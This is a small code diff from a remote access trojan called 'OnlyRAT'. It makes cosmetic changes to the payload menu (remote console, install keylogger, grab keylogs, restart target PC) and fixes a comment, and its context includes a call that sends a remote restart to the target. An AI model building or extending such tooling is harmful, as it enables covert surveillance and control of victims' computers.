@@ -36,17 +36,17 @@ help_menu = """
 options_menu = """
         [+] Payloads:
             [0] - Remote Console
-            [1] - Keylogger
+            [1] - Install Keylogger
             [2] - Grab Keylogs
             [3] - Restart Target PC
 
         [+] Options:
-            [h] or [help]    -- Help Menu
-            [c] or [config]  -- Display RAT File
+            [h] or [help] ----- Help Menu
+            [c] or [config] --- Display RAT File
             [v] or [version] -- Version Number
-            [u] or [update]  -- Update OnlyRAT
-            [r] or [remove]  -- Remove OnlyRAT
-            [q] or [quit]    -- Quit
+            [u] or [update] --- Update OnlyRAT
+            [r] or [remove] --- Remove OnlyRAT
+            [q] or [quit] ----- Quit
 
             * any other commands will be 
               sent through your terminal
@@ -264,7 +264,7 @@ def cli(arguments):
             elif option == "3":
                 remote_command(ipv4, password, "shutdown /r")
 
-            # help me
+            # help menu
             elif option == "h" or option == "help":
                 main()
 
